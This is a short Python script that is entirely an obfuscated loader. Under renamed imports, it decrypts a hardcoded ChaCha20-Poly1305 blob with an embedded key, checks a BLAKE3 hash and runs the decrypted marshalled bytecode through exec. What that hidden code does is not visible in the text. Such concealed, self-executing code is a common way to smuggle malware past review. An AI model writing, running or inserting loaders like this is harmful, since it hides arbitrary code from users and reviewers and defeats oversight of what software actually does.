import marshal as X000001
from blake3 import blake3 as X000002
from Crypto.Cipher import ChaCha20_Poly1305 as X000004
X000005 = X000004.new(key=b'u\xe1\xda\xaf\xa6\xd2\xe8\xa5G\xaa\xcc\xf3\xa3\xd1q\x88Ev\xbc\xf7F4a\xa09_\xec\xdd.\xc8%\xe7', nonce=b'k\x97\xc3\x04\xd5\x87\x9f<\xb2KC\xea.\xe7\xd9\xaa\xeeX\xd3\xdf[\x18\x7fy').decrypt_and_verify(b'\x17\xd1\xa2\x862\x13x\xda@a\x16\x9ec\xfe\xde\xb7\x9b\xd7\xcb\xca\r\x89!\x06d\x12\x15\x9f\x04\xe0\xcf8_xK=}\xd9o\x19\x93\xa0\xc3\x96j\xf0\xfe\x8cV&A\xcbx;=c\xd4\xd0\x06j\x92\xf0V1W\x1e_\xcf\xe3\xac\x98\xe6\xc3\x90\xf5!Y<\x86\xae}\xa3]u\xf0\xf6\xaa\x15\x06\x03\xbamd[.\x064)\xc2\xd2\xd6` \xb8w\xe4bH\xba\x06\xe2\xadN\xc9\xd3\xebI\x9bO^\x05\xac\x89\x9a\xfbBb\'\x13=\x82\xf6\xf5\x85\xc0\xb9u\xcbkI\x9e\xc9\xf14f6\xc4\xf1v\x96\x0f\xc9\xd5\xa8\xf8p\xba$\x13d.\xcf\xa7I\xdd\t\x03\xeb\xcbhb\x08;B\xe3A\x12\xf5\xe4\x85P\xe6\x92D:\x9cvo\x99\xce\xeaP\xc6m\xac6\x12\x7f\xa0\x06\xbe~$J\xa3\xf9p$\x80j\xe932\\\x03\x80\x06\x83\xe7|\x88T\x0c\xc46\xbfp\x19\xcf\x94X\xb7]\xba\x8a\x852\x8e7\x82\xed>m\x15\x0b\x01\x87r)/\xaf\xaaaV\xb0\xc9\x7f\xdc\x99\xcbt\xb6]\xf4<\xabD\xd8#\xf8\x7fD\x9f}\x88\xf8E\x887\xa3g,\x8b\xeb\x06\xe2\xd1\x93\xa5?\xcc\xc9\xd1\x8e\xfb\n\x06\xe6\xa6\x0c9\x95g\xbeh\xd6\xec\xd5\xdd\xfa\xb3\t\xab\xe2\xffq\xf0\xba\x98\xa0\xd4\xe9\xa2\xd2@\xaf\xab\xa5P5\xaft\xa6Y\xa1\x9aW\\6\xfb\xf0)\xb0\x97\xe0,s\x06\xa7\xe5G\xef\x18H\xfa\x9d\x14\xf1\xfd\xf0N\xce{B\x9f\x82\x94\xa0\xdab\x97\xbc\xc3\xa0>\x1fN\xbd\xff\xddU\x8a]\xf3\xda\xed\xeb\xf2^\x8a\x14t\x8f3u\x9d\xdd!\x03%\x18\xecI\xb6\xaa\xc7\xd8\x83,(\x02\x86(\x8f{\x9d\x8b\xe1f\xdc\x8e\xd2I&\xcbf\xc7\xf7\xe7\x8e=.\x1d\xce-\xc7(\x13\xe7\xedV\xc2x[\ru\xe8\xfc\x141\x07+~\x85+)\xe2\xde?5\x88\x16\xa5`\xb7"\xf5\\\x14\x95UXk\x1d\x0b\x8an\xaf\xf8[\x8a\xb6P*\xc2T-Z\xf3i\xed3r\xa6\xb2\x0b<y\x84\xd8bd\xc5\xad.h\x9a\xaa\x18\xd9=&Z1\x06A\xa7\x91\xf3?\xbfW1\xcb\x13\xa6\xac\xfa\xdf\xc2\xa0P\xa2x!\r\xc9\x1a\xb1\x9a\xfd\xd3\x90\xec\xb5\x10f\xe9\x1b7\xa1S\xf1\xee\x0fx\xf7\xc2\x97mu\x12\xc0\x80B\xf2\xd3o\x10\xbb\xd6\x8e\r\xa7\x031I\xa6\xd0\x14\x8a\xfeZ\x8f\xc7\xb0\xf8\r/\xe3\xc8\x98(rE\xad2\xabc\x9b\xe6\xec\xfa\xc5w\xa9\xc85\xa0\xad\x80\x12\r2M#\x15D\t\xb4\x16\xb7\xc6\x8b\xac\xf0\xf6J\xfa\x9d\xd3\xcd\\\xd6\xc2\xf7\xee4\x8f\xc6\xc5\xb0s5\n\xcf\xfb)\xc6T\xc3\xb4D*\x86\xa4\x98\xdd\xd3I\x97\x8a\x83\xd9[\xeb\x95kZ(\xf3sm\xd6k\xc6\x7frc\xcd\x03\x8cT\x85L$\xe7+\xe0\x12\x93\xe4\xa9\x16', b'\xa68LD\xc5\xe8\xa7j\x1b\xfd\xe5\xff\xf5\xa1\xfen')
if (X000002(X000005).hexdigest() == 'c104888c5846c8f729bc75082eacdc133ad23f9b8e04068ec150780135e2f40a'):
    exec(X000001.loads(X000005[16:]))